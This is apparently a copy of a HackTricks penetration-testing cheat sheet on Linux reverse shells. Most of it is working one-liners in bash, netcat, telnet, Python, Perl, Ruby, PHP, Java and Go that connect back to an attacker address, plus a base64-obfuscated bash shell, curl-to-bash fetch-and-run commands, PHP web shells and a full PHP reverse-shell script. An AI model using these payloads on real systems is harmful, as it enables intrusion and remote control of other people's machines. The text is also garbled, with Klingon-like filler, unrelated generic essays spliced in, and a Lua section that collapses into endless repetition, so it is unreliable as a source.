# Shells - Linux

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks AWS Red Team Expert</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**If you have questions about any of these shells you could check them with** [**https://explainshell.com/**](https://explainshell.com)

## Full TTY

**Once you get a reverse shell**[ **read this page to obtain a full TTY**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### Symbol jatlh shell

The symbol jatlh shell is a powerful tool for executing commands and managing a system. It provides a wide range of features and functionalities that can be used for various purposes, including hacking and penetration testing.

To access the symbol jatlh shell, you can use the following methods:

1. **Remote Access**: If you have remote access to a system, you can establish a connection to the symbol jatlh shell using SSH or Telnet protocols. This allows you to execute commands and interact with the system remotely.

2. **Local Access**: If you have physical access to a system, you can directly access the symbol jatlh shell by opening a terminal or console window. This allows you to execute commands and manage the system locally.

Once you have access to the symbol jatlh shell, you can leverage its capabilities to perform various tasks, such as:

- **Command Execution**: You can execute commands to perform specific actions on the system, such as running programs, manipulating files, or modifying system configurations.

- **File Management**: You can navigate through the file system, create, delete, or modify files and directories, and perform operations like copying, moving, or renaming files.

- **Process Management**: You can view and manage running processes, start or stop services, and monitor system resources.

- **Network Operations**: You can perform network-related tasks, such as configuring network interfaces, checking network connectivity, or troubleshooting network issues.

- **Privilege Escalation**: You can exploit vulnerabilities or misconfigurations to escalate your privileges and gain higher levels of access to the system.

It is important to note that the symbol jatlh shell should only be used for authorized purposes, such as ethical hacking or system administration. Unauthorized use or misuse of the shell can lead to legal consequences. Always ensure that you have proper authorization and follow ethical guidelines when using the symbol jatlh shell.
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell explanation

1. **`bash -i`**: **`bash -i`** vItlhutlh interactive (`-i`) Bash shell.
2. **`>&`**: **`>&`** vItlhutlh **standard output** (`stdout`) je **standard error** (`stderr`) **redirect** **same destination**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: **`/dev/tcp/<ATTACKER-IP>/<PORT>`** **TCP connection** **specified IP address and port** **represents** **special file**.
* **output je error streams** **file** **redirect**, **command** **output** **interactive shell session** **attacker's machine** **effectively sends**.
4. **`0>&1`**: **`0>&1`** **standard input (`stdin`)** **same destination** **redirect**.

### Create in file and execute
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

If you encounter an **RCE vulnerability** within a Linux-based web application, there might be instances where **obtaining a reverse shell becomes difficult** due to the presence of Iptables rules or other filters. In such scenarios, consider creating a PTY shell within the compromised system using pipes.

You can find the code in [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

You just need to modify:

* The URL of the vulnerable host
* The prefix and suffix of your payload (if any)
* The way the payload is sent (headers? data? extra info?)

Then, you can just **send commands** or even **use the `upgrade` command** to get a full PTY (note that pipes are read and written with an approximate 1.3s delay).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Check it in [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
### Introduction

Telnet is a network protocol that allows you to establish a remote connection to a device over the internet or a local network. It is commonly used for remote administration and troubleshooting purposes.

### Telnet Client

To connect to a remote device using Telnet, you need a Telnet client. Most operating systems have a built-in Telnet client, but you can also use third-party software like PuTTY or SecureCRT.

### Telnet Commands

Once you have established a Telnet session, you can use various commands to interact with the remote device. Some common Telnet commands include:

- **open**: Establish a connection to a remote device.
- **close**: Close the current Telnet session.
- **quit**: Exit the Telnet client.
- **help**: Display a list of available Telnet commands.
- **login**: Authenticate yourself with the remote device.
- **logout**: Terminate your session with the remote device.

### Telnet Security Risks

Telnet is considered insecure because it transmits data, including usernames and passwords, in plain text. This makes it vulnerable to eavesdropping and man-in-the-middle attacks. It is recommended to use more secure protocols like SSH instead of Telnet.

### Telnet Alternatives

As mentioned earlier, SSH is a more secure alternative to Telnet. It encrypts the data transmitted between the client and the server, providing better security. Other alternatives include remote desktop protocols like RDP (Remote Desktop Protocol) and VNC (Virtual Network Computing).

### Conclusion

Telnet is a useful protocol for remote administration and troubleshooting, but it is not secure due to its lack of encryption. It is recommended to use more secure alternatives like SSH for remote connections.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Attacker**
```bash
while true; do nc -l <port>; done
```
**QaStaHvIS**:
QaStaHvIS vItlhutlh. ngeD enter vItlhutlh je CTRL+D vItlhutlh (STDIN jImej).
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

### Introduction

Python is a versatile and powerful programming language that is widely used in the field of hacking. It provides a wide range of libraries and tools that can be leveraged for various hacking tasks. In this section, we will explore some of the key features and techniques of Python that are relevant to hacking.

### Python Shells

Python shells are interactive environments that allow you to execute Python code and get immediate feedback. They are particularly useful for testing and experimenting with code snippets. There are several Python shells available, including the standard Python shell, IPython, and Jupyter notebooks.

#### Standard Python Shell

The standard Python shell is a basic interactive shell that comes bundled with the Python installation. It provides a simple interface for executing Python code and viewing the output. To start the standard Python shell, open a terminal and type `python` or `python3` depending on your Python version.

#### IPython

IPython is an enhanced interactive shell for Python that offers many additional features compared to the standard Python shell. It provides features such as tab completion, syntax highlighting, and command history. To start IPython, open a terminal and type `ipython` or `ipython3`.

#### Jupyter Notebooks

Jupyter notebooks are a web-based interactive computing environment that allows you to create and share documents containing live code, equations, visualizations, and narrative text. Jupyter notebooks support multiple programming languages, including Python. To start a Jupyter notebook, open a terminal and type `jupyter notebook`.

### Python Libraries for Hacking

Python has a vast ecosystem of libraries and frameworks that can be used for hacking purposes. Some of the popular libraries and frameworks include:

- **Requests**: A powerful library for making HTTP requests and interacting with web services.
- **Beautiful Soup**: A library for parsing HTML and XML documents, which is useful for web scraping and data extraction.
- **Scapy**: A powerful packet manipulation library that allows you to create, send, and capture network packets.
- **Paramiko**: A library for SSH protocol implementation, which can be used for remote administration and exploitation.
- **Pycrypto**: A library for cryptographic operations, such as encryption, decryption, and hashing.
- **Selenium**: A library for automating web browsers, which is useful for web application testing and scraping.

These are just a few examples of the many libraries available in Python for hacking. Depending on your specific needs, you may find other libraries that are more suitable for your tasks.

### Python Scripts for Hacking

Python scripts are a common tool used by hackers for automating tasks and performing various hacking techniques. Python's simplicity and versatility make it an ideal language for writing hacking scripts. Some of the common tasks that can be automated using Python scripts include:

- **Web scraping**: Python scripts can be used to scrape data from websites, extract information, and perform analysis.
- **Network scanning**: Python scripts can be used to scan networks, identify open ports, and detect vulnerabilities.
- **Exploitation**: Python scripts can be used to exploit vulnerabilities in target systems and gain unauthorized access.
- **Password cracking**: Python scripts can be used to perform brute-force attacks and crack passwords.
- **Data manipulation**: Python scripts can be used to manipulate and analyze data, such as extracting information from databases or log files.

Python scripts can be executed from the command line or integrated into other tools and frameworks. They provide a flexible and powerful way to automate hacking tasks and streamline the penetration testing process.

### Conclusion

Python is a versatile and powerful programming language that is widely used in the field of hacking. It provides a wide range of libraries, shells, and scripting capabilities that can be leveraged for various hacking tasks. By mastering Python and its associated tools, you can enhance your hacking skills and become a more effective hacker.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl (Practical Extraction and Reporting Language) is a high-level, general-purpose programming language that is commonly used for scripting and system administration tasks. It is known for its powerful text processing capabilities and its ability to handle complex data structures.

Perl is often used in the context of web development, where it can be used to write CGI scripts and interact with databases. It is also commonly used for tasks such as file manipulation, network programming, and automation.

One of the key features of Perl is its extensive library of modules, which provide additional functionality and make it easier to accomplish specific tasks. These modules can be easily installed and imported into Perl scripts, allowing developers to leverage existing code and save time.

Perl scripts are typically executed by an interpreter, which reads the script line by line and executes the corresponding instructions. This makes Perl a flexible and versatile language, as scripts can be easily modified and run on different platforms without the need for recompilation.

Overall, Perl is a powerful and flexible programming language that is well-suited for a wide range of tasks. Its rich set of features and extensive library of modules make it a popular choice among developers and system administrators.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

### Introduction

Ruby is a dynamic, object-oriented programming language that is known for its simplicity and readability. It was created in the mid-1990s by Yukihiro Matsumoto, also known as Matz. Ruby has gained popularity among developers due to its elegant syntax and powerful features.

### Features

- **Dynamic Typing**: Ruby is dynamically typed, which means that variable types are determined at runtime. This allows for more flexibility and ease of use.

- **Object-Oriented**: Everything in Ruby is an object, including numbers, strings, and even classes. This makes Ruby a pure object-oriented language.

- **Garbage Collection**: Ruby has automatic garbage collection, which means that developers don't have to worry about memory management.

- **Blocks and Closures**: Ruby supports blocks and closures, which are powerful programming constructs that allow for flexible and concise code.

- **Metaprogramming**: Ruby has powerful metaprogramming capabilities, which allow developers to modify and extend the language itself.

### Syntax

Here are some examples of Ruby syntax:

```ruby
# Variables
name = "John"
age = 25

# Conditionals
if age >= 18
  puts "You are an adult"
else
  puts "You are a minor"
end

# Loops
5.times do |i|
  puts "Iteration #{i}"
end

# Classes
class Person
  attr_accessor :name, :age

  def initialize(name, age)
    @name = name
    @age = age
  end

  def greet
    puts "Hello, my name is #{@name} and I am #{@age} years old"
  end
end

# Creating an instance of the Person class
person = Person.new("John", 25)
person.greet
```

### Resources

- [Official Ruby Website](https://www.ruby-lang.org/)
- [Ruby Documentation](https://ruby-doc.org/)
- [Ruby Gems](https://rubygems.org/)

### Conclusion

Ruby is a powerful and elegant programming language that is widely used in web development, scripting, and automation. Its simplicity and readability make it a great choice for both beginners and experienced developers.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

### Reverse Shell

#### PHP Reverse Shell - One-liner

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### PHP Reverse Shell - Full Script

```php
<?php
$ip = '10.0.0.1';  // Attacker's IP address
$port = 1234;  // Attacker's port

$sock = fsockopen($ip, $port);
$descriptorspec = array(
   0 => $sock,
   1 => $sock,
   2 => $sock
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);

if (is_resource($process)) {
   while (true) {
       foreach ($pipes as $pipe) {
           $read = array($pipe);
           $write = NULL;
           $except = NULL;
           $num_changed_streams = stream_select($read, $write, $except, 0);
           if ($num_changed_streams === false) {
               break;
           }
           foreach ($read as $stream) {
               $data = fread($stream, 8192);
               if (strlen($data) === 0) {
                   break 2;
               }
               fwrite($sock, $data);
           }
       }
   }
   fclose($sock);
   proc_close($process);
}
?>
```

### Web Shells

#### PHP Web Shell

```php
<?php echo system($_GET['cmd']); ?>
```

#### PHP Web Shell with Password Protection

```php
<?php
$password = 'password123';  // Set your desired password here

if (isset($_GET['password']) && $_GET['password'] === $password) {
    echo system($_GET['cmd']);
} else {
    echo 'Access denied.';
}
?>
```

### File Upload Shells

#### PHP File Upload Shell

```php
<?php
$target_dir = '/var/www/html/uploads/';  // Directory where the uploaded file will be saved
$target_file = $target_dir . basename($_FILES['file']['name']);
$upload_ok = 1;
$image_file_type = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

// Check if the file is an image
if (isset($_POST['submit'])) {
    $check = getimagesize($_FILES['file']['tmp_name']);
    if ($check !== false) {
        echo 'File is an image - ' . $check['mime'] . '.';
        $upload_ok = 1;
    } else {
        echo 'File is not an image.';
        $upload_ok = 0;
    }
}

// Check if the file already exists
if (file_exists($target_file)) {
    echo 'Sorry, file already exists.';
    $upload_ok = 0;
}

// Check file size
if ($_FILES['file']['size'] > 500000) {
    echo 'Sorry, your file is too large.';
    $upload_ok = 0;
}

// Allow only certain file formats
if ($image_file_type != 'jpg' && $image_file_type != 'png' && $image_file_type != 'jpeg' && $image_file_type != 'gif') {
    echo 'Sorry, only JPG, JPEG, PNG, and GIF files are allowed.';
    $upload_ok = 0;
}

// Check if $upload_ok is set to 0 by an error
if ($upload_ok == 0) {
    echo 'Sorry, your file was not uploaded.';
} else {
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo 'The file ' . basename($_FILES['file']['name']) . ' has been uploaded.';
    } else {
        echo 'Sorry, there was an error uploading your file.';
    }
}
?>
```

#### PHP File Upload Shell with Password Protection

```php
<?php
$password = 'password123';  // Set your desired password here
$target_dir = '/var/www/html/uploads/';  // Directory where the uploaded file will be saved
$target_file = $target_dir . basename($_FILES['file']['name']);
$upload_ok = 1;
$image_file_type = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

// Check if the file is an image
if (isset($_POST['submit'])) {
    $check = getimagesize($_FILES['file']['tmp_name']);
    if ($check !== false) {
        echo 'File is an image - ' . $check['mime'] . '.';
        $upload_ok = 1;
    } else {
        echo 'File is not an image.';
        $upload_ok = 0;
    }
}

// Check if the file already exists
if (file_exists($target_file)) {
    echo 'Sorry, file already exists.';
    $upload_ok = 0;
}

// Check file size
if ($_FILES['file']['size'] > 500000) {
    echo 'Sorry, your file is too large.';
    $upload_ok = 0;
}

// Allow only certain file formats
if ($image_file_type != 'jpg' && $image_file_type != 'png' && $image_file_type != 'jpeg' && $image_file_type != 'gif') {
    echo 'Sorry, only JPG, JPEG, PNG, and GIF files are allowed.';
    $upload_ok = 0;
}

// Check if $upload_ok is set to 0 by an error
if ($upload_ok == 0) {
    echo 'Sorry, your file was not uploaded.';
} else {
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo 'The file ' . basename($_FILES['file']['name']) . ' has been uploaded.';
    } else {
        echo 'Sorry, there was an error uploading your file.';
    }
}
?>
```
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

### Introduction

Java is a widely used programming language that is known for its versatility and portability. It is commonly used for developing various types of applications, including web, desktop, and mobile applications. In this section, we will explore some key concepts and techniques related to Java programming.

### Key Concepts

#### Object-Oriented Programming (OOP)

Java is an object-oriented programming language, which means that it is based on the concept of objects. Objects are instances of classes, which are the blueprints for creating objects. In Java, everything is an object, including variables, methods, and even the main program itself.

#### Syntax and Structure

Java has a strict syntax and structure that must be followed in order for the code to compile and run correctly. The code is organized into classes, which contain methods and variables. Each class is defined in a separate file with the same name as the class. The main method is the entry point of a Java program and is where the program starts executing.

#### Memory Management

Java uses automatic memory management, which means that the programmer does not have to explicitly allocate and deallocate memory. Instead, Java has a garbage collector that automatically frees up memory when it is no longer needed. This helps to prevent memory leaks and makes Java programs more robust and reliable.

### Tools and Resources

#### Integrated Development Environments (IDEs)

There are several popular IDEs available for Java development, including Eclipse, IntelliJ IDEA, and NetBeans. These IDEs provide a range of features and tools to help developers write, debug, and test their Java code more efficiently.

#### Documentation and Libraries

Java has a vast ecosystem of libraries and frameworks that can be used to enhance the functionality of Java applications. The official Java documentation is a valuable resource for learning about the various classes and methods available in the Java standard library. Additionally, there are many online resources and forums where developers can find help and share their knowledge with others.

### Conclusion

Java is a powerful and versatile programming language that is widely used for developing a wide range of applications. By understanding the key concepts and utilizing the available tools and resources, developers can create robust and efficient Java programs.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat is a powerful networking utility that can be used for various purposes, including port scanning, banner grabbing, and creating reverse shells. It is a command-line tool that comes pre-installed on many Linux distributions.

### Installation

To install Ncat on a Linux system, you can use the package manager of your distribution. For example, on Ubuntu, you can run the following command:

```
sudo apt-get install ncat
```

### Basic Usage

Ncat can be used to establish TCP and UDP connections, send and receive data, and create encrypted tunnels. Here are some basic examples of how to use Ncat:

- To connect to a remote server on a specific port:

```
ncat <server_ip> <port>
```

- To listen for incoming connections on a specific port:

```
ncat -l <port>
```

- To send a file to a remote server:

```
ncat <server_ip> <port> < file.txt
```

- To receive a file from a remote server:

```
ncat -l <port> > file.txt
```

### Advanced Usage

Ncat also supports various advanced features, such as SSL encryption, proxy connections, and port forwarding. Here are some examples of how to use these features:

- To establish an SSL-encrypted connection:

```
ncat --ssl <server_ip> <port>
```

- To connect through a proxy server:

```
ncat --proxy <proxy_ip>:<proxy_port> <server_ip> <port>
```

- To forward a local port to a remote server:

```
ncat -l <local_port> --sh-exec "ncat <remote_ip> <remote_port>"
```

- To create a reverse shell:

```
ncat -l -p <port> -e /bin/bash
```

### Conclusion

Ncat is a versatile networking utility that can be used for a wide range of tasks. Whether you need to establish connections, transfer files, or create encrypted tunnels, Ncat provides a simple and powerful solution.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

vItlhutlhvam vulnerabilities vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua jImejDaq 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 